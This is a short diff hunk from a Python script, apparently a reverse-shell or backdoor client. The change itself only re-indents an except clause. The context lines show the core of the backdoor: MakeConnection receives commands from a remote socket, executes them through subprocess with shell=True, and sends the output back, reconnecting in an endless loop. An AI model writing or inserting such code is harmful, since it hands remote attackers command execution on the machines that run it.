@@ -36,7 +36,7 @@ def MakeConnection(h, p):
        			        proc = subprocess.Popen(command, stdout=subprocess.PIPE , stderr=subprocess.PIPE , shell=True) # Execute the sent command
         			proc_result = proc.stdout.read() + proc.stderr.read() 
         			sock.send(proc_result) 
-	except socket.error:
+    except socket.error:
 		pass  
 while True:
 	MakeConnection(host, port) 
